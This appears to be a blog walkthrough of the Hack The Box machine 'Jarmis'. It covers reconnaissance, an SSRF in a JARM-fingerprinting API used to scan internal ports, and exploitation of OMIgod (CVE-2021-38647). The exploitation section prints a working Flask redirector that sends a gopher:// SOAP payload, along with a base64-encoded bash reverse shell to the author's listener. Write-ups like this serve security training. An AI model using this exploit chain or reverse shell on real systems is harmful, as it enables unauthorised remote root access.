---
title: "Jarmis Walkthrough(HTB)"
date: 2025-03-20
draft: false 
description: "Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell."
tags: ["Hard", "Linux", "HTB", "hacking", "Web", "Walkthrough"]
---
## About 
Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell. 

## Reconnaissance & Enumeration
- Nmap scan results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Jarmis
|_http-favicon: Unknown favicon MD5: C92B85A5B907C70211F4EC25E29A8C4A
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 1.433 days (since Thu Mar 13 07:56:57 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   391.17 ms 10.10.14.1
2   391.18 ms 10.10.11.117

```
- The scan looks normal, with usual order of a web port and ssh port.
- From loading and looking at the favicon itself I can tell that this a react page
- The root page looks static, it's showing loading for a while now so I fired up ffuf for directory enumeration.
- Quickly ffuf finds couple of endpoints
![We-Got-something](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExa2JkNzJiNmM5czEyczA4eGhmeWx6dThsZnQ3b2R1YXR3ZnI1M3NlayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/ONmiNZnGPbrLWGYTEh/giphy.gif)

```
❯ ffuf -u http://10.10.11.117/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 60

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.117/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 266ms]
docs                    [Status: 200, Size: 967, Words: 195, Lines: 31, Duration: 267ms]
favicon.ico             [Status: 200, Size: 3870, Words: 16, Lines: 13, Duration: 273ms]
index.html              [Status: 200, Size: 2254, Words: 67, Lines: 1, Duration: 278ms]
robots.txt              [Status: 200, Size: 67, Words: 3, Lines: 4, Duration: 276ms]
static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 262ms]
:: Progress: [4744/4744] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:22] :: Errors: 0 ::

```
- `/docs` gets me to API documentation as I expected 
![Pasted image 20250314183340.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250314183340.png?raw=true)
- Let's test each endpoint one by one. The first endpoint `api/v1/search/id/{jarm_id}` takes an integer as input so I provided a random number and got a signature back as json data in the response

### Testing the endpoints
**Endpoint-1**
	- This is the curl command
```bash
curl 'http://10.10.11.117/api/v1/search/id/3' -H 'accept: application/json' | jq
```
- Apparently the output may look like this 
```json
{
  "id": 3,
  "sig": "29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af",
  "ismalicious": false,
  "endpoint": "151.101.193.140:443",
  "note": "reddit.com"
}
```
**Endpoint-2**
	- Endpoint 2 is `api/v1/search/signature/?keyword=<SIG>&max_results=10` takes string value as input
	- So when I input that signature from endpoint-1(Previous) it gives results.
```bash
curl 'http://10.10.11.117/api/v1/search/signature/?keyword=29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&max_results=10' -H 'accept: application/json' | jq
```
- Response:
```
{
  "results": [
    {
      "id": 3,
      "sig": "29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af",
      "ismalicious": false,
      "endpoint": "151.101.193.140:443",
      "note": "reddit.com"
    },
    {
      "id": 67,
      "sig": "29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af",
      "ismalicious": false,
      "endpoint": "151.101.129.140:443",
      "note": "reddit.com"
    },
    {
      "id": 87,
      "sig": "29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af",
      "ismalicious": false,
      "endpoint": "185.199.111.153:443",
      "note": "panda.tv"
    },
    {
      "id": 92,
      "sig": "29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af",
      "ismalicious": false,
      "endpoint": "151.101.65.111:443",
      "note": "theguardian.com"
    },
    {
      "id": 108,
      "sig": "29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af",
      "ismalicious": false,
      "endpoint": "151.101.194.132:443",
      "note": "thestartmagazine.com"
    },
    {
      "id": 131,
      "sig": "29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af",
      "ismalicious": false,
      "endpoint": "151.101.2.137:443",
      "note": "wikihow.com"
    }
  ]
}

```
- The results are odd anyway lets move on to next endpoint which should be the last one in the list

**Endpoint-3**
	- This endpoint itself interesting as it ends in `/fetch` and takes a string as input. This is the full endpoint `/api/v1/fetch`
- Thi endpoint is promising so to test this I tried to hit back my host through this endpoint, First I spawned a nc listener and requested via this endpoint like this
```bash
curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001' -H 'accept: application/json'
```
- The reflection on nc my listener looks rather interesting cause, hmm...look at this
![alien-lang](https://media1.tenor.com/m/2VCSbTAr25QAAAAC/nonsense-talk.gif)
```
❯ nc -lnvp 6001
listening on [any] 6001 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 42834
�����&�so*�z�E_9l�s�e|��Kg8 u� ������Z1I�Wv㝱8�n1G����3g�����9k�����E�����	�#�����+�
�$�����,�r�s̩�����'�/��(�0�`�a�v�w̨��
/<�����5=�����A����
                   10.10.14.18�


3&$ �����}L�)z/3��7�U�Ս�4�Q�xI���-+%
```
- This looks like an encrypted value to me, it could be a certificate or handshake but something encrypted that's for sure so I fired up a listener with ssl
- Typical nc(NetCat) may give errors cause by default nc doesn't support SSL so I installed `ncat` with `sudo apt-get install ncat` then used this command to get a listener with ssl.

{{< badge >}} definition {{< /badge >}}
- "ncat" is a modern reimplementation of the venerable Netcat, developed by the Nmap Project, and is a flexible tool for reading, writing, redirecting, and encrypting data across a network, often used for security testing and administration tasks
```bash
ncat --ssl -lnvp 443
```
- Now the connection just cuts off after two seconds, Which is weird
```
❯ ncat --ssl -lnvp 443
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 0362 8FEE A32F 8320 7092 B6DC BA81 43C8 A83F 4CB5
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.117:47406.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
```
- I got this as my response from this request which is different in compared to previous one
```
{
  "sig": "21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46",
  "ismalicious": false,
  "endpoint": "10.10.14.18:443",
  "note": "Ncat?",
  "server": ""
}
```
### Understanding JARM
- Before we move onto the next we have to learn about **JARM**

{{< badge >}} Definition {{< /badge >}}
- JARM (or JARM fingerprinting) is an active Transport Layer Security (TLS) server fingerprinting tool developed by Salesforce that helps identify and group servers based on their TLS configuration, potentially revealing malicious servers or malware command and control (C2) infrastructure
- This [article](https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/) goes in-depth with JARM but the bottom line is, JARM works by **actively sending 10 TLS Client Hello packets to a target TLS server and capturing specific attributes of the TLS Server Hello responses**. The aggregated TLS server responses are then hashed in a specific way to produce the JARM fingerprint.

- My guess here is the response signature that I got must be from the first request out of the ten intended ones NetCat should've allowed only one connection, I can change it allow multiple connections by including the `-k` flag.
- Now I actually got ten connections in the logs
```
❯ ncat --ssl -lnvkp 443
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 0293 5838 F917 921F 69AB 00DB 4768 FC73 813C 4488
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.117:47618.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
Ncat: Connection from 10.10.11.117:47620.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
Ncat: Connection from 10.10.11.117:47622.
Ncat: Failed SSL connection from 10.10.11.117: error:0A0000C1:SSL routines::no shared cipher
Ncat: Connection from 10.10.11.117:47624.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
Ncat: Connection from 10.10.11.117:47626.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
Ncat: Connection from 10.10.11.117:47628.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
Ncat: Connection from 10.10.11.117:47634.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
Ncat: Connection from 10.10.11.117:47636.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
Ncat: Connection from 10.10.11.117:47640.
Ncat: Failed SSL connection from 10.10.11.117: error:0A0000C1:SSL routines::no shared cipher
Ncat: Connection from 10.10.11.117:47642.
Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad key share

```
- The response from this also looks weird, now the response has different looking signature than the previous ones:
```
❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18' -H 'accept: application/json' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   122  100   122    0     0     15      0  0:00:08  0:00:07  0:00:01    27
{
  "sig": "21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21",
  "endpoint": "10.10.14.18:443",
  "note": "10.10.14.18"
}
```
- This is the response from single connection:
```
❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18' -H 'accept: application/json' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   148  100   148    0     0     28      0  0:00:05  0:00:05 --:--:--    39
{
  "sig": "21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46",
  "ismalicious": false,
  "endpoint": "10.10.14.18:443",
  "note": "Ncat?",
  "server": ""
}
```
- This the response from the first(From normal NetCat) or non-TLS listener:
```
❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001' -H 'accept: application/json' 
{"sig":"00000000000000000000000000000000000000000000000000000000000000","endpoint":"10.10.14.18:6001","note":"10.10.14.18"}
```
- We can see the differences clearly. Also in my recent response multiple fields are missing (i.e. `server`, `ismalicious`) 
- As my recent response seemed weird I used the Endpoint-1 to check the signature and the response from the request shows that my recent response is not in the database
```
❯ curl 'http://10.10.11.117/api/v1/search/signature/?keyword=21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21&max_results=10' -H 'accept: application/json' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    14  100    14    0     0     22      0 --:--:-- --:--:-- --:--:--    22
{
  "results": []
}
```
- We can see in the previous requests as it made from ncat it shows `note` value as `NCAT?` also `ismalicious=false` which is suspicious, as there could be fields with the value being true.
- Thankfully we can identify this easily by iterating over all the values in the ID parameter(Endpoint-1). First let us narrow down the values 
```
❯ curl http://10.10.11.117/api/v1/search/id/400 
null%                                                                                                                  
HTB/Machines/Jarmis 
❯ curl http://10.10.11.117/api/v1/search/id/300 
null%                                                                                                                  
HTB/Machines/Jarmis 
❯ curl http://10.10.11.117/api/v1/search/id/200 
{"id":200,"sig":"29d29d00029d29d21c29d29d29d29df3fb741bc8febeb816e400df4c5f2e9e","ismalicious":false,"endpoint":"176.32.103.205:443","note":"amazon.com"}%  
```
- So the values should be between 0 to 200 or in along those lines. Now lets get the accurate value
```
HTB/Machines/Jarmis 
❯ curl http://10.10.11.117/api/v1/search/id/220
{"id":220,"sig":"29d29d00029d29d21c42d43d00041d44609a5a9a88e797f466e878a82e8365","ismalicious":false,"endpoint":"3.211.157.115:443","note":"netflix.com"}%                                                                                    
HTB/Machines/Jarmis 
❯ curl http://10.10.11.117/api/v1/search/id/230
null%                                                                                                                  
HTB/Machines/Jarmis 
❯ curl http://10.10.11.117/api/v1/search/id/221
{"id":221,"sig":"29d3fd00029d29d21c42d43d00041df48f145f65c66577d0b01ecea881c1ba","ismalicious":false,"endpoint":"35.186.224.25:443","note":"spotify.com"}%                                                                                    
HTB/Machines/Jarmis 
❯ curl http://10.10.11.117/api/v1/search/id/222
{"id":222,"sig":"27d27d27d00027d1dc27d27d27d27d3446fb8839649f251e5083970c44ad30","ismalicious":false,"endpoint":"47.246.24.234:443","note":"login.tmall.com"}%                                                                                
HTB/Machines/Jarmis 
❯ curl http://10.10.11.117/api/v1/search/id/223
null%      
```
- I got the accurate value which is `222`. Now lets perform the enumeration
- For this I made a simple bash script
```bash
#!/bin/bash

for id_num in {1..222}; do
	curl -s  http://10.10.11.117/api/v1/search/id/$id_num | jq 'select(.ismalicious == true)'
done

```
- This was the output:
```
❯ ./automation.sh 
jq: parse error: Invalid numeric literal at line 1, column 7
jq: parse error: Invalid numeric literal at line 1, column 7
{
  "id": 95,
  "sig": "2ad2ad00000000000043d2ad2ad43dc4b09cccb7c1d19522df9b67bf57f4fb",
  "ismalicious": true,
  "endpoint": "104.24.4.98",
  "note": "Sliver",
  "server": "Apache/2.4.40"
}
jq: parse error: Invalid numeric literal at line 1, column 7
{
  "id": 128,
  "sig": "2ad2ad0002ad2ad00042d42d000000ad9bf51cc3f5a1e29eecb81d0c7b06eb",
  "ismalicious": true,
  "endpoint": "185.199.109.153",
  "note": "SilentTrinity",
  "server": ""
}
{
  "id": 135,
  "sig": "21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46",
  "ismalicious": true,
  "endpoint": "104.24.4.98",
  "note": "Ncat",
  "server": ""
}
{
  "id": 154,
  "sig": "07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d",
  "ismalicious": true,
  "endpoint": "99.86.230.31",
  "note": "Metasploit",
  "server": "apache"
}
{
  "id": 170,
  "sig": "22b22b09b22b22b22b22b22b22b22b352842cd5d6b0278445702035e06875c",
  "ismalicious": true,
  "endpoint": "94.140.114.239",
  "note": "Trickbot",
  "server": "Cowboy"
}
{
  "id": 174,
  "sig": "29d21b20d29d29d21c41d21b21b41d494e0df9532e75299f15ba73156cee38",
  "ismalicious": true,
  "endpoint": "192.64.119.215",
  "note": null,
  "server": ""
}
{
  "id": 178,
  "sig": "1dd40d40d00040d1dc1dd40d1dd40d3df2d6a0c2caaa0dc59908f0d3602943",
  "ismalicious": true,
  "endpoint": "192.145.239.18",
  "note": "AsyncRAT",
  "server": ""
}
{
  "id": 179,
  "sig": "2ad2ad0002ad2ad00043d2ad2ad43da5207249a18099be84ef3c8811adc883",
  "ismalicious": true,
  "endpoint": "94.140.114.239",
  "note": "Sliver",
  "server": "Apache/2.4.38"
}
{
  "id": 184,
  "sig": "28d28d28d00028d00041d28d28d41dd279b0cf765af27fa62e66d7c8281124",
  "ismalicious": true,
  "endpoint": "51.136.77.112",
  "note": "Gophish",
  "server": "nginx"
}
{
  "id": 197,
  "sig": "07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1",
  "ismalicious": true,
  "endpoint": "104.17.237.190",
  "note": "CobaltStrike",
  "server": ""
}
```
- There are like 10 outputs,  metasploit looks interesting. Let's see what happens if listened from metasploit.
- In metasploit select this module `auxillary/server/capture/http` and then set the port to 443, make SSL to true. Here is the oneliner
```bash
sudo msfconsole -x "use auxiliary/server/capture/http; set srvport 443; set SSL true; run"
```
- Now I curled the fetch endpoint like this and got the note as `Metasploit`. 
```
❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18' | jq . 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   154  100   154    0     0     18      0  0:00:08  0:00:08 --:--:--    32
{
  "sig": "07d19d12d21d21d07c42d43d000000f50d155305214cf247147c43c0f1a823",
  "ismalicious": false,
  "endpoint": "10.10.14.18:443",
  "note": "Metasploit?",
  "server": ""
}
```
- Metasploit log:
```
msf6 auxiliary(server/capture/http) > 
[*] Started service listener on 0.0.0.0:443 
[*] Server started.
[*] HTTP REQUEST 10.10.11.117 > 10.10.14.18:80 GET / Unknown   cookies=
```
### Testing with SSRF
- After a while, I tested the fetch endpoint for SSRF and there is SSRF to local host
- I can determine the open ports within the internal network with this vulnerability. The responses differ between open and closed, For an example
- **Open Port:**
```
❯ curl 'http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:22' -H 'accept: application/json' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   117  100   117    0     0    128      0 --:--:-- --:--:-- --:--:--   128
{
  "sig": "00000000000000000000000000000000000000000000000000000000000000",
  "endpoint": "127.0.0.1:22",
  "note": "localhost"
}

```
- **Open Port:**
```
❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2Flocalhost:80' -H 'accept: application/json' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   117  100   117    0     0    187      0 --:--:-- --:--:-- --:--:--   187
{
  "sig": "00000000000000000000000000000000000000000000000000000000000000",
  "endpoint": "127.0.0.1:80",
  "note": "localhost"
}

```
- **Closed Port**
```
❯ curl 'http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:21' -H 'accept: application/json' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   109  100   109    0     0    110      0 --:--:-- --:--:-- --:--:--   110
{
  "sig": "00000000000000000000000000000000000000000000000000000000000000",
  "endpoint": "null",
  "note": "localhost"
}
```
- As you can see if the port is open it includes `127.0.0.1` in the response else it gives the value `null`
{{< alert >}}  To automate this I could use bash script but it would be slower, So **choosing the script below is not recommended** {{< /alert >}}
```bash
#!/bin/bash

BASE_URL="http://jarmis.htb/api/v1/fetch"

START_PORT=1
END_PORT=65535 

for port in $(seq $START_PORT $END_PORT); do

  URL="$BASE_URL?endpoint=http://localhost:$port"


  RESPONSE=$(curl -s "$URL" -H 'accept: application/json' | jq -r '.endpoint')


  if [[ "$RESPONSE" == "127.0.0.1:$port" ]]; then
    echo "Port $port is open"
  fi
done

```
- So I used Fuff to scan 
```bash
ffuf -u 'http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ' -w <(seq 1 65535) -t 60 -fr '"endpoint":"null"'
```
- The results looks interesting for a Linux box
```

22                      [Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 446ms]
80                      [Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 333ms]
5986                    [Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 342ms]
8001                    [Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 368ms]
33028                   [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 292ms]
55394                   [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 332ms]
```
- Port `5986` and `5985` seems interesting particularly because in windows those ports are used by WinRM. 
- In the ffuf scan I didn't get port `5985` but I tested it manually. It took me 20 seconds to respond may be that's why ffuf marked it as closed but anyway this port seems interesting.
```
❯ curl 'http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:5985' -H 'accept: application/json' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   119  100   119    0     0      5      0  0:00:23  0:00:20  0:00:03    27
{
  "sig": "00000000000000000000000000000000000000000000000000000000000000",
  "endpoint": "127.0.0.1:5985",
  "note": "localhost"
}
```
![it-starts](https://media1.tenor.com/m/oGkf9b9L9FsAAAAC/cbb2-cbbus2.gif)
## Exploitation

### CVE-2021-38647
- The port 5985 has Microsoft Open Management Infrastructure running we can exploit this service using [CVE-2021-38647](https://nvd.nist.gov/vuln/detail/CVE-2021-38647) and there is also a [POC](https://github.com/horizon3ai/CVE-2021-38647) for this. But the POC just sends POST request to 5985 (Without TLS) or to 5986 (TLS included)
- Vulnerable part of this application is, Usually JARM sends 10 requests to verify and generate signature this part is known to us but here when the listener is malicious (i.e ismalicious=true) then JARM sends one extra request which is the 11th request. If we could get that request on listener then we could potentially modify it to use the exploit OMIGod(CVE-2021-38647).
- To achieve this we need to modify the Ip tables rules as proxy chains doesn't support this level of precision
- Lets flush all the previous rules in the IP tables
```bash
sudo iptables -t nat -F
```
- Then add this rule to redirect the 11th request from `443` to port `8443`
```bash
sudo iptables -I PREROUTING -t nat -p tcp --dport 443 -m statistic --mode nth --every 11 --packet 10 -j REDIRECT --to-port 8443
```
#### Preparing the stage
- To test this lets open two listeners, one on port `443` other on `8443`
```bash
ncat --ssl -lnvp 443
```
- for port `8443`
```bash
ncat -ssl -lnvp 8443
```
- I used `fetch` endpoint on my IP, and this worked very well 
- On port `443`
```
❯ ncat --ssl -lnvp 443 
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 5B1D F737 C43E 3686 B058 EB4F 6C11 40B8 94DA 6CAD
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.117:56524.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading

```
- Redirected 11th request from  port `443` to `8443`
```
❯ ncat --ssl -lnvp 8443
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 0B19 D1FA 27A0 86F1 D1AC 874E D599 8BF0 9DD1 9DD0
Ncat: Listening on [::]:8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 10.10.11.117:56544.
GET / HTTP/1.1
Host: 10.10.14.18
User-Agent: curl/7.74.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
```
- Now we can exploit this using Gopher protocol. I have used this protocol before when doing Travel box, basically this protocol uses no headers thus perfect for delivering payloads
- I copied the payload data from the [POC](https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/refs/heads/main/omigod.py) and after  that I added curly braces replacing previous command data then included it into this python code. 
```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)    

DATA = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
   <s:Header>
      <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
      <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
      <a:ReplyTo>
         <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
      </a:ReplyTo>
      <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
      <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
      <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
      <w:OperationTimeout>PT1M30S</w:OperationTimeout>
      <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
      <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
      <w:OptionSet s:mustUnderstand="true" />
      <w:SelectorSet>
         <w:Selector Name="__cimnamespace">root/scx</w:Selector>
      </w:SelectorSet>
   </s:Header>
   <s:Body>
      <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
         <p:command>{}</p:command>
         <p:timeout>0</p:timeout>
      </p:ExecuteShellCommand_INPUT>
   </s:Body>
</s:Envelope>
"""

REQUEST = """POST / HTTP/1.1\r
Host: localhost:5985\r
User-Agent: curl/7.74.0\r
Content-Length: {length}\r
Content-Type: application/soap+xml;charset=UTF-8\r
\r
{body}"""

@app.route('/')    
def root(): 
    cmd = "echo 'YmFzaCAtYyAiZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTgvNjAwMSA8JjEiCg==' | base64 -d | bash"
    data = DATA.format(cmd)
    req = REQUEST.format(length=len(data)+2, body=data)
    enc_req = quote(req, safe='')
    return redirect(f'gopher://127.0.0.1:5985/_{enc_req}', code=301) 
    
    
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=False, host="0.0.0.0", port=8443)

```
 - I also included the base64 encoded  reverse shell payload in the above python code 
```bash
echo 'bash -c "exec bash -i &>/dev/tcp/10.10.14.18/6001 <&1"' | base64
```
- Basically this python code will listen on 8443 and Upon receiving sends the request to target's port 5985 with including malicious payload as data. Then the malicious payload will run the reverse shell.

### Performing the attack
- Starting the python program
```bash
python3 exp.py
```
- Starting the ncat listener on port `443`
```bash
ncat --ssl -lnvp 443
```
- Starting the reverse shell listener
```bash
nc -lvnp 6001
```
- As we already made the IP rule to redirect the 11th request from port `443` to port `8443`. Now lets start the attack by using `fetch` endpoint pointing to our listener on port `443`.

```
❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   176  100   176    0     0      2      0  0:01:28  0:01:02  0:00:26    42
jq: parse error: Invalid numeric literal at line 1, column 7

```
- Response from 443 listener:
```
❯ ncat --ssl -lnvp 443
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 9834 084E 3280 ECD3 7580 D227 EA15 2E75 6E9F B3C4
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.117:58228.
Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading

```
- Response from the python listener:
```
❯ python3 exp.py                                                                  
 * Serving Flask app 'exp'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on https://127.0.0.1:8443
 * Running on https://192.168.65.240:8443
Press CTRL+C to quit
10.10.11.117 - - [14/Mar/2025 23:55:13] "GET / HTTP/1.1" 301 -
```
- Got the reverse shell connection and secured both the {{< keyword >}} User flag {{< /keyword >}} & {{< keyword >}} Root flag {{< /keyword >}}
```
❯ nc -lvnp 6001

listening on [any] 6001 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 53816
